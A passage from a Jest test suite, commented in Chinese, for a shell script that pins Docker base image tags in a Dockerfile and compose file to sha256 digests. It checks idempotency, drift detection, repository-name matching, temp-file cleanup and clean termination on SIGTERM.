    expect(r.dockerfile).not.toMatch(DOUBLE_DIGEST);
    // compose 只钉指令行；注释里那份"用法示例"必须原样留着
    // （它带的是 `<捕获值>` 占位符，不是十六进制摘要，所以"全文刷新 digest"那条
    //   表达式也碰不到它——示例保持示例，不会被改成一个具体的假 digest）
    expect(r.compose).toMatch(/^ {4}image: mongo:6\.0\.20@sha256:b{64}$/m);
    expect(r.compose).toContain('# 用法示例：image: mongo:6.0.20@sha256:<捕获值>');
    expect(r.compose).toMatch(/^ {4}image: x$/m); // 其它 image 不受影响（行锚定，注释里的子串不算）
    // 目标根必须被打印出来：默认值是脚本自己的仓库根，看不见它就会把测试打到真仓库上。
    // 只比对临时目录名：MSYS/Git Bash 会把 C:\... 回显成 /tmp/... 形式，完整路径不可比。
    expect(r.out).toContain('目标仓库根：');
    expect(r.out).toContain(path.basename(fx.dir));
    // 调用序列：先 info 探活，两个 tag 都 pull 之后才 inspect，且顺序与常量表一致。
    expect(callSeq(r)).toEqual([
      'info',
      'pull node:22.14.0-alpine',
      'pull mongo:6.0.20',
      'inspect node:22.14.0-alpine',
      'inspect mongo:6.0.20',
    ]);
  });

  test('幂等重跑必须报错，而不是"报告成功但一字未改"（sed 无匹配仍返回 0 的老缺陷）', () => {
    const fx = fixture();
    const first = run(fx, ['--apply']);
    expect(first.code).toBe(0);
    const second = run(fx, ['--apply']);
    expect(second.code).not.toBe(0);
    expect(second.out).toContain('已经存在');
    // 第二次失败不得破坏已钉好的内容
    expect(second.dockerfile).toBe(first.dockerfile);
    expect(second.compose).toBe(first.compose);
  });

  test('脚本常量与仓库文件漂移（tag 变了）⇒ 必须报错，不得静默跳过', () => {
    const fx = fixture();
    driftDockerfileTag(fx);
    const r = run(fx, ['--apply']);
    expect(r.code).not.toBe(0);
    expect(r.out).toContain('漂移');
    // compose 那一步还没跑到，Dockerfile 必须保持未改（失败要早于动作）
    expect(r.dockerfile).toContain('node:22.99.9-alpine');
    // 行锚定：注释里也有同名子串，用 toContain 会假通过
    expect(r.compose).toMatch(/^ {4}image: mongo:6\.0\.20$/m);
  });

  test('--apply 在前、--root 在后也必须生效（旧实现只看第一个参数）', () => {
    const fx = fixture();
    const r = run(fx, ['--apply', '--root=<ROOT>']);
    expect(r.code).toBe(0);
    expect(r.dockerfile).toContain('@sha256:');
  });

  test.each([
    ['<no value> 形态', 'novalue'],
    ['空输出形态', 'empty'],
    ['长度不足的伪 digest', 'wrongarch'],
  ])('digest 取不到（%s）⇒ 拒绝写入任何文件', (_label, mode) => {
    const fx = fixture();
    const r = run(fx, ['--apply'], mode);
    expect(r.code).not.toBe(0);
    expect(r.out).toContain('digest');
    // 最关键的一条：不能把 `FROM <no value>` 之类的东西写进 Dockerfile
    expect(r.dockerfile).toBe(fx.dockerfile);
    expect(r.compose).toBe(fx.compose);
  });

  test('参数顺序无关：--root 在前、--apply 在后也必须生效', () => {
    // 旧实现是 `[ "${1:-}" = "--apply" ] && APPLY=1`，只看第一个参数 ⇒
    // `sh x.sh --root=... --apply` 会静默地"什么都不做还报成功"。
    const fx = fixture();
    const r = run(fx, ['--root=<ROOT>', '--apply']);
    expect(r.code).toBe(0);
    expect(r.dockerfile).toContain('@sha256:');
  });

  test('未知参数直接拒绝（不得忽略后继续改文件）', () => {
    const fx = fixture();
    const r = run(fx, ['--aply']);
    expect(r.code).toBe(2);
    expect(r.out).toContain('未知参数');
    expect(r.dockerfile).toBe(fx.dockerfile);
  });

  /**
   * 半钉状态是这个脚本特有的失效形状，它同时踩中两条：
   * ① 供应链上 compose 仍指向**可变 tag**，而仓库看起来"已经钉过版"；
   * ② 唯一能修它的脚本从此**拒绝再跑**（旧顺序会把 Dockerfile 先落笔）。
   * 实测复现过：旧实现是"边检查边落笔、两个目标顺序跑"，compose 漂移时 Dockerfile 已写盘。
   * 所以这里必须逐字节比（`toBe`），`toContain('node:22.14.0-alpine')` 挡不住"改了一半"。
   */
  test('第二个目标（compose）漂移 ⇒ 第一个目标一个字都不写，也不留临时文件', () => {
    const fx = fixture();
    const drifted = driftCompose(fx.compose);
    driftComposeTag(fx);
    const r = run(fx, ['--apply']);
    expect(r.code).not.toBe(0);
    expect(r.out).toContain('漂移');
    expect(r.dockerfile).toBe(fx.dockerfile);
    expect(r.compose).toBe(drifted);
    expect(r.tmps).toEqual([]);
  });

  test('半钉不是死路：照报错修好 compose 之后重跑，两个目标都能钉上', () => {
    // 旧顺序下这一条跑不通——第一轮已经把 Dockerfile 钉了，第二轮在第一步就退出。
    const fx = fixture();
    driftComposeTag(fx);
    expect(run(fx, ['--apply']).code).not.toBe(0);
    expect(fs.readFileSync(path.join(fx.dir, 'Dockerfile'), 'utf8')).toBe(fx.dockerfile);
    writeCompose(fx, fx.compose);
    const second = run(fx, ['--apply']);
    expect({ code: second.code, tail: second.out.slice(-120) }).toMatchObject({ code: 0 });
    expect(second.dockerfile).toContain(`FROM ${NODE_PINNED}`);
    expect(second.compose).toMatch(/^ {4}image: mongo:6\.0\.20@sha256:b{64}$/m);
    expect(second.tmps).toEqual([]);
  });

  test('同名临时文件已存在：拒绝、不覆盖，退出时也不删（trap 只清自己创建的）', () => {
    const fx = fixture();
    const tmp = path.join(fx.dir, 'Dockerfile.pin.tmp');
    const SENTINEL = '上一次中断留下的产物，或别人手工放的：脚本既不能改它也不能删它\n';
    fs.writeFileSync(tmp, SENTINEL, 'utf8');
    const r = run(fx, ['--apply']);
    expect(r.code).not.toBe(0);
    expect(r.out).toContain('临时文件已存在');
    expect(r.out).toContain('Dockerfile.pin.tmp');
    expect(r.dockerfile).toBe(fx.dockerfile);
    expect(r.compose).toBe(fx.compose);
    // 最关键的一条：这次非零退出会走 EXIT trap，trap 必须**没有**碰到它。
    // 直觉写法 `trap 'rm -f "$ROOT"/*.pin.tmp' EXIT` 就是在这里删掉运维的文件。
    expect(fs.readFileSync(tmp, 'utf8')).toBe(SENTINEL);
    // 非空集自证：同一个 readdir 过滤器看得见这个文件。少了它，上面/下面的
    // `tmps === []` 都可能是"过滤器永远返回空"造成的假绿。
    expect(r.tmps).toEqual(['Dockerfile.pin.tmp']);
    // 报错也不是死路：人工删除后必须能正常钉版，且成功运行自己不留临时文件
    fs.rmSync(tmp);
    const after = run(fx, ['--apply']);
    expect({ code: after.code, tmps: after.tmps }).toMatchObject({ code: 0, tmps: [] });
    expect(after.dockerfile).toContain(`FROM ${NODE_PINNED}`);
  });

  test('产物形态是 name:tag@sha256:<hex>：钉版门禁的判据判绿（旧实现在这里判红）', () => {
    // RepoDigests 用全限定名（docker.io/library/node@sha256:…，天生不带 tag）。
    // 旧实现把整串当引用写进文件 ⇒ tag 消失，而同一条期望就写在
    // src/tests/security/baseImageDigestPinned.test.js 的 FROM 判据里
    // （/^node:22\.14\.0-alpine@sha256:[0-9a-f]{64}$/）——照脚本的升级路径跑一次就变红。
    // 这里把闸的判据**原样搬进来**跑在脚本产物上，两道口径再也分不开。
    const fx = fixture();
    const r = run(fx, ['--apply'], 'qualified');
    expect({ code: r.code, tail: r.out.slice(-120) }).toMatchObject({ code: 0 });
    const fromImages = r.dockerfile
      .split(/\r?\n/)
      .filter((line) => line.startsWith('FROM '))
      .map((line) => line.slice('FROM '.length).split(' ')[0]);
    expect(fromImages).toHaveLength(2); // 非空集自证：真有两条 FROM 被检查了
    for (const image of fromImages) {
      expect(image).toMatch(/^node:22\.14\.0-alpine@sha256:[0-9a-f]{64}$/);
    }
    const mongoLine = r.compose.split(/\r?\n/).find((line) => line.startsWith('    image: mongo'));
    expect(mongoLine).toBeTruthy();
    expect(mongoLine.replace('    image: ', '')).toMatch(/^mongo:6\.0\.20@sha256:[0-9a-f]{64}$/);
    // registry 名号不许残留在产物里（它就是"tag 被整段换掉"的那个形状）
    expect(r.dockerfile).not.toContain('docker.io');
    expect(r.compose).not.toContain('docker.io');
    expect(r.dockerfile).not.toMatch(DOUBLE_DIGEST);
    expect(r.tmps).toEqual([]);
  });

  test('docker 的名号口径不影响产物：短名与全限定 RepoDigests 收敛成同一串', () => {
    const short = run(fixture(), ['--apply'], 'good');
    const qualified = run(fixture(), ['--apply'], 'qualified');
    expect({ dockerfile: short.dockerfile, compose: short.compose }).toEqual({
      dockerfile: qualified.dockerfile,
      compose: qualified.compose,
    });
    expect(short.dockerfile).toContain(`FROM ${NODE_PINNED} AS builder`);
  });

  /**
   * 这一臂就是 2026-10-04 之前本仓库的真实状态，也是旧实现的死路：
   * 它把"已钉"判成错误并在第一个目标就退出 ⇒ compose 那条未钉的引用**永远钉不上**，
   * 而 `baseImageDigestPinned` 的文件头把"跑本脚本重新捕获"写成唯一的升级路径。
   * 现在的期望是反过来：Dockerfile 逐字节不动，compose 钉上，并把"跳过了谁"打印出来。
   */
  test('混合仓库（已钉 Dockerfile + 未钉 compose）：跳过已钉的那个，把没钉的那个钉上', () => {
    const fx = fixture();
    pinDockerfileOnly(fx);
    const pinnedDockerfile = fs.readFileSync(path.join(fx.dir, 'Dockerfile'), 'utf8');
    const r = run(fx, ['--apply'], 'qualified');
    expect({ code: r.code, tail: r.out.slice(-160) }).toMatchObject({ code: 0 });
    expect(r.dockerfile).toBe(pinnedDockerfile); // 一个字节都不动
    expect(r.dockerfile).not.toMatch(DOUBLE_DIGEST);
    expect(r.compose).toMatch(/^ {4}image: mongo:6\.0\.20@sha256:b{64}$/m);
    // 运维要能看见"谁被跳过了"：静默跳过与静默改动同样是失效
    expect(r.out).toContain('跳过');
    expect(r.out).toContain('Dockerfile');
    expect(r.tmps).toEqual([]);
  });

  test('待刷新不是死路：钉在别的 digest 上 ⇒ 换成刚捕获的，注释里的示例一起跟上', () => {
    // 上游把同名 tag 的内容滚动了（digest 变了）时，唯一正确的动作就是替换旧 digest。
    // 旧实现把这种仓库判成"不可操作"。注释里那行 `docker pull node:…@sha256:<旧>` 也要跟上：
    // 只改指令行的话，注释从"正确示例"变成"错误示例"，而它正是运维照抄的那一行。
    const fx = fixture();
    stalePinBoth(fx);
    const r = run(fx, ['--apply']);
    expect({ code: r.code, tail: r.out.slice(-160) }).toMatchObject({ code: 0 });
    expect(r.dockerfile).toContain(`FROM ${NODE_PINNED} AS builder`);
    expect(r.dockerfile).toContain('# 用法示例：docker pull ' + NODE_PINNED);
    expect(r.dockerfile).not.toContain(HEX_OLD);
    expect(r.dockerfile).not.toMatch(DOUBLE_DIGEST);
    expect(r.compose).toContain(`image: ${MONGO_PINNED}`);
    expect(r.tmps).toEqual([]);
    // 刷完再跑就是整体 no-op：必须报错，不能报成功
    expect(run(fx, ['--apply']).code).not.toBe(0);
  });

  test('混合到单行也能收敛：同一文件里已钉的行不动、未钉的行钉上', () => {
    const fx = fixture();
    writeDockerfile(
      fx,
      `FROM ${NODE_PINNED} AS builder\nRUN echo build\nFROM node:22.14.0-alpine AS runner\nUSER nodejs\n`
    );
    const r = run(fx, ['--apply'], 'qualified');
    expect({ code: r.code, tail: r.out.slice(-160) }).toMatchObject({ code: 0 });
    expect(r.dockerfile.split('\n')[0]).toBe(`FROM ${NODE_PINNED} AS builder`); // 原样
    expect(r.dockerfile.match(/@sha256:/g) || []).toHaveLength(2); // 每条 FROM 恰好一个 digest
    expect(r.dockerfile).toContain('AS runner'); // 这条被钉上
    expect(r.dockerfile).not.toMatch(DOUBLE_DIGEST);
    expect(r.tmps).toEqual([]);
    // 幂等：再跑一次必须报错而不是把已钉的两条都改坏
    const again = run(fx, ['--apply'], 'qualified');
    expect(again.code).not.toBe(0);
    expect(again.dockerfile).toBe(r.dockerfile);
  });

  test('指令词后的空白宽度不参与判断：`FROM  node:…` 双空格也要钉上', () => {
    // 锚定用的是"一个或多个空白"，不是常量里那一串单空格的字面串；
    // 反过来，值的位置不对（见失败矩阵）就必须停手。
    const fx = fixture();
    writeDockerfile(fx, 'FROM  node:22.14.0-alpine  AS builder\n');
    const r = run(fx, ['--apply']);
    expect({ code: r.code, tail: r.out.slice(-120) }).toMatchObject({ code: 0 });
    expect(r.dockerfile).toBe(`FROM  ${NODE_PINNED}  AS builder\n`);
  });

  /**
   * 前缀陷阱的前提自证：钉版形态**仍然包含**脚本常量那串字面量。
   * 旧实现的全部错误都从这一格出发（`grep -qF "$old"` 判"可改" ⇒ 无边界前缀替换 ⇒ 双 digest），
   * 所以这里把它钉成断言：将来有人把分类器换回子串匹配，本用例仍然为真、
   * 而上面那两条"已钉 ⇒ 跳过/no-op"会立刻红——两条一起构成完整证据链。
   * 最后那一格是判据本身的非空集自证：只把 `@` 换成空格，三条判据必须同时翻转，
   * 否则这几条断言可能只是在描述一个恒真式。
   */
  test('前提自证：钉版行包含 old 字面串，但 old 后紧跟 @ ⇒ 属于"已钉"而不是"可改"', () => {
    const pinnedLine = `FROM ${NODE_PINNED} AS builder`;
    expect(pinnedLine).toContain('FROM node:22.14.0-alpine'); // 无边界子串判据会被它骗过
    expect(pinnedLine).toMatch(/^FROM node:22\.14\.0-alpine@/); // 边界判据认它是"已钉"
    expect(pinnedLine).not.toMatch(/^FROM node:22\.14\.0-alpine(\s|$)/m); // 后随空白或行尾才算"可改"
    expect(DOUBLE_DIGEST.test(pinnedLine)).toBe(false);
    const lookalike = pinnedLine.replace('-alpine@', '-alpine ');
    expect(lookalike).toMatch(/^FROM node:22\.14\.0-alpine(\s|$)/m);
    expect(lookalike).not.toMatch(/^FROM node:22\.14\.0-alpine@/);
    // 行为侧的同一格：把 `@` 换成空格（值仍是裸 tag、行里却多出一个游离摘要），
    // 同一个脚本就从"已钉/跳过"翻成"形态处理不了"——判据不是恒真式。
    const stray = fixture();
    strayDockerfile(stray);
    const r = run(stray, ['--apply']);
    expect(r.code).not.toBe(0);
    expect(r.out).toContain('处理不了');
    expect(r.dockerfile).toContain('node:22.14.0-alpine @sha256:');
  });

  test('无 tag 的纯 digest 引用（旧实现的产物）⇒ 拒绝，不追加第二个 digest', () => {
    // `FROM docker.io/library/node@sha256:…` 是本脚本 2026-10-03 之前的写法留下的现场：
    // 它符合"已按 digest 固定"的直觉，却不带可读 tag，且字符串里根本没有 tag 常量可以挂。
    // 猜一个 tag 上去就是编造事实；跳过它就是"仓库里还有一条可变引用却没人知道"。
    const fx = fixture();
    taglessDockerfile(fx);
    const r = run(fx, ['--apply']);
    expect(r.code).not.toBe(0);
    expect(r.out).toContain('没有可读 tag');
    expect(r.dockerfile).toBe(`FROM docker.io/library/node@sha256:${HEX_A}\n`);
    expect(r.compose).toBe(fx.compose);
    expect(r.tmps).toEqual([]);
  });

  test('RepoDigests 的仓库名与请求的引用对不上 ⇒ 取不到 digest，一个文件都不碰', () => {
    // 追加式写法把 digest 尾巴挂到 `$tag` 上：一旦 RepoDigests[0] 其实属于别的镜像，
    // 写出去的就是"这个 tag 指向那个 digest"这个不成立的断言，只能等构建期 pull 才炸。
    // 形状判据拦不住它——先自证这一点：
    const wrongName = `docker.io/library/alpine@sha256:${HEX_A}`;
    expect(wrongName).toMatch(/@sha256:[0-9a-f]{64}$/);
    const fx = fixture();
    const r = run(fx, ['--apply'], 'wrongname');
    expect(r.code).not.toBe(0);
    expect(r.out).toContain('对不上');
    expect(r.out).toContain('docker.io/library/alpine');
    expect(r.dockerfile).toBe(fx.dockerfile);
    expect(r.compose).toBe(fx.compose);
    expect(r.tmps).toEqual([]);
    // 反向自证：同一支替身只把仓库名换回 node 就必须放行，
    // 否则上面那条红可能只是替身没跑起来。
    expect(run(fixture(), ['--apply'], 'good').code).toBe(0);
  });

  test('隐式命名空间与带端口的 registry 都必须判对（只比末段会把别人的仓库当成自己）', () => {
    // 这两侧是同一条对账逻辑的两个方向：
    //   少做归一 ⇒ `docker.io/myorg/mongo` 的 digest 被挂到官方 mongo 上（判据只看末段时成立）；
    //   归一做错 ⇒ `reg.example.com:8443/…` 这种合法引用被硬拒（从第一个冒号截断取仓库名时成立）。
    // 判据取自脚本源码本身（见 extractFn），不是在测试里重写一份。
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'digests-name-'));
    tracked.push(dir);
    const harness = path.join(dir, 'name.sh');
    fs.writeFileSync(
      harness,
      [
        'set -eu',
        extractFn('repo_of_ref'),
        extractFn('norm_repo'),
        'want=$(norm_repo "$(repo_of_ref "$1")")',
        'got=$(norm_repo "${2%@*}")',
        'if [ "$want" = "$got" ]; then echo ACCEPT; else echo "REJECT $got != $want"; fi',
      ].join('\n'),
      'utf8'
    );
    const cases = [
      ['node:22.14.0-alpine', `node@sha256:${HEX_A}`, true],
      ['node:22.14.0-alpine', `docker.io/library/node@sha256:${HEX_A}`, true],
      ['mongo:6.0.20', `docker.io/library/mongo@sha256:${HEX_B}`, true],
      ['mongo:6.0.20', `docker.io/myorg/mongo@sha256:${HEX_B}`, false],
      ['mongo:6.0.20', `registry.example.com/mongo@sha256:${HEX_B}`, false],
      // 带端口的 registry：tag 分隔符只在**最后一个 `/` 之后**才算 tag，否则是端口
      [
        'reg.example.com:8443/library/node:1.2',
        `reg.example.com:8443/library/node@sha256:${HEX_A}`,
        true,
      ],
      ['prom/prometheus:v2.53.0', `docker.io/prom/prometheus@sha256:${HEX_A}`, true],
    ];
    const verdicts = cases.map(([tag, digest]) => {
      const r = spawnSync(SH, [harness, tag, digest], { encoding: 'utf8' });
      return { tag, digest, out: ((r.stdout || '') + (r.stderr || '')).trim() };
    });
    for (const [i, [tag, digest, shouldPass]] of cases.entries()) {
      expect({ tag, digest, accepted: verdicts[i].out.startsWith('ACCEPT') }).toEqual({
        tag,
        digest,
        accepted: shouldPass,
      });
      if (!shouldPass) expect(verdicts[i].out).toContain('REJECT');
    }
    // 非空集自证：判据不是"一律 ACCEPT"，也不是"一律 REJECT"
    expect(verdicts.filter((v) => v.out.startsWith('ACCEPT'))).toHaveLength(5);
  });

  test.each(pinCorpus)('$name ⇒ 声明的条数与逐字节产物互相印证', (row) => {
    const fx = fixture();
    writeDockerfile(fx, row.dockerfile);
    writeCompose(fx, row.compose);
    const r = run(fx, ['--apply']);
    expect({ name: row.name, code: r.code, tail: r.out.slice(-160) }).toMatchObject({ code: 0 });

    const check = (label, plan, srcBefore, srcAfter, want) => {
      const line = planLine(r.out, label);
      const declared =
        plan.bare + plan.refresh > 0
          ? `待钉 ${plan.bare} 条、待刷新 ${plan.refresh} 条、已是本次 digest ${plan.same} 条 ⇒ 本次会改动`
          : `${plan.same} 条指令行全都已经钉在刚捕获的 digest 上 ⇒ 本次跳过（不改动）`;
      expect({ name: row.name, label, plan: line.trim() }).toMatchObject({ label });
      expect(line).toContain(declared);
      // 逐字节期望产物：这是"多改一笔"的唯一防线
      expect(srcAfter).toBe(want);
      const beforeLines = srcBefore.split('\n');
      const afterLines = srcAfter.split('\n');
      expect(afterLines).toHaveLength(beforeLines.length); // 只改形态，不增删行
      const changed = [];
      for (let i = 0; i < beforeLines.length; i += 1) {
        if (beforeLines[i] !== afterLines[i]) changed.push(i);
      }
      // 越界自证：被改动的每一行（按**改动前**的内容判）都必须含本脚本常量里的 tag。
      // 脚本从未声明要碰与常量无关的行（redis / prometheus / `${APP_IMAGE:-…}`），碰到了就是边界漏了。
      for (const i of changed) {
        expect(beforeLines[i]).toMatch(/node:22\.14\.0-alpine|mongo:6\.0\.20/);
      }
      // 声明条数 ⇔ 指令行改动条数。注释里的示例跟着换是**有意为之**（那也是一条引用），
      // 所以这里只对齐指令行，注释那一笔由上面的逐字节期望产物把守。
      const instrChanged = changed.filter((i) =>
        /^(\s*)(FROM|image:)[ \t]/.test(beforeLines[i])
      ).length;
      expect({ name: row.name, label, instrChanged }).toMatchObject({
        instrChanged: plan.bare + plan.refresh,
      });
    };
    check('Dockerfile', row.dfPlan, row.dockerfile, r.dockerfile, row.wantDockerfile);
    check('docker-compose.yml', row.cfPlan, row.compose, r.compose, row.wantCompose);
    expect(r.tmps).toEqual([]);
  });

  test('差分语料覆盖三种处置（语料本身别退化成只测"全裸"）', () => {
    const sum = (k) => pinCorpus.reduce((acc, row) => acc + row.dfPlan[k] + row.cfPlan[k], 0);
    expect({ bare: sum('bare'), refresh: sum('refresh'), same: sum('same') }).toEqual({
      bare: 5,
      refresh: 2,
      same: 2,
    });
    // 非空集自证：至少一条语料里"改动的行"包含注释行（示例跟着换），
    // 且至少一条语料里的注释示例**没被**改（占位符不是摘要）——两个方向都得有。
    expect(pinCorpus.map((row) => row.name)).toHaveLength(3);
  });

  /**
   * 信号必须**终止**运行，而不只是清残留。
   *
   * 旧写法是 `trap 'cleanup_pin_tmp' EXIT HUP INT TERM`：运维按下 Ctrl-C 之后脚本继续把两个
   * 目标文件写完，还打印"已替换并校验"、rc=0（2026-10-04 审计实测）。"钉版被中断"和
   * "钉版做完了"在运维眼前是同一份输出，这就是失效。
   *
   * 时机不靠竞速：docker 替身每次调用睡 1 秒，整轮约 5 秒，而驱动脚本在第 1 秒发 SIGTERM——
   * 那一刻连第一个 digest 都还没捕获完，离**第一次落笔**（预演临时文件）还差整个 capture + 分类阶段。
   * 所以"信号之后文件有没有被动"是一个稳定差值。断言里同时验 rc=143、两个目标逐字节原样、
   * 不留 `*.pin.tmp`、且输出里绝不会出现成功文案。
   */
  test('SIGTERM 必须真的停下来：rc=143、两个目标一字不写、不留临时文件、不报成功', () => {
    const fx = fixture();
    const drive = path.join(fx.dir, 'drive.sh');
    const out = path.join(fx.dir, 'drive.out');
    fs.writeFileSync(
      drive,
      [
        'set -u',
        '"$1" "$2" --root="$3" > "$4" 2>&1 &',
        'pid=$!',
        'sleep 1',
        'kill -TERM "$pid" 2>/dev/null || echo KILLFAILED',
        'wait "$pid"',
        'printf "RC=%s\\n" "$?"',
      ].join('\n'),
      'utf8'
    );
    const env = {
      ...process.env,
      PATH: `${path.join(fx.dir, 'bin')}${path.delimiter}${process.env.PATH}`,
      STUB_LOG: fx.log,
      DOCKER_STUB_SLEEP: '1',
    };
    const d = spawnSync(SH, [drive, SH, SCRIPT, fx.dir, out], { env, encoding: 'utf8' });
    // 驱动脚本的 stdout 只有 printf 那一行。`wait` 被信号打断时，shell 会把作业终止语写到
    // **自己的 stderr**：实测 dash（CI 的 /bin/sh）给出 stdout="RC=143"、stderr="Terminated"，
    // 两流一拼就是 "RC=143\nTerminated"，`$` 锚点必然落空——那不是脚本没退出，是把 shell 的
    // 作业通知当成了脚本输出。所以 rc 只认 stdout 那一行；`printed` 只留作否定断言（拼两流
    // 正是为了不漏掉任何一侧的失败文案）。
    const driverOut = (d.stdout || '').trim();
    const printed = ((d.stdout || '') + (d.stderr || '')).trim();
    const scriptOut = readOr(out) || '';
    // 前提自证：替身确实被叫醒过，说明脚本是在**运行中**被信号打死的，不是跑完才退出
    const calls = readOr(fx.log) || '';
    expect(calls).toContain('docker info');
    expect(printed).not.toContain('KILLFAILED');
    expect(driverOut).toMatch(/RC=143$/);
    expect(readOr(path.join(fx.dir, 'Dockerfile'))).toBe(fx.dockerfile);
    expect(readOr(path.join(fx.dir, 'docker-compose.yml'))).toBe(fx.compose);
    expect(fs.readdirSync(fx.dir).filter((f) => f.endsWith('.pin.tmp'))).toEqual([]);
    expect(scriptOut).not.toMatch(/已替换并校验|钉好|→/);
  }, 30000);

  test('反向自证：失败矩阵的表宽 = 处理函数形参个数（窄一格是超时假绿，不是失败）', () => {
    expect({ declared: checkFailure.length }).toEqual({ declared: 6 });
    expect({ widths: [...new Set(failureArms.map((row) => row.length))] }).toEqual({
      widths: [6],
    });
    // 行数也是台账的一部分：增删一臂必须在这里留痕
    expect({ rows: failureArms.length }).toEqual({ rows: 25 });
    // 判据本身非空集：把行削窄一格必须点亮
    const narrow = failureArms.map((row) => row.slice(0, 5));
    expect(narrow.every((row) => row.length === checkFailure.length)).toBe(false);
    // 每臂的退出码都写死在表里：只填 1 会让"未知参数应当 2"这一格变成装饰
    expect([...new Set(failureArms.map((row) => row[4]))]).toEqual([1, 2]);
  });

  test.each(failureArms)('%s ⇒ 目标文件逐字节不变且不留临时文件', checkFailure);
});
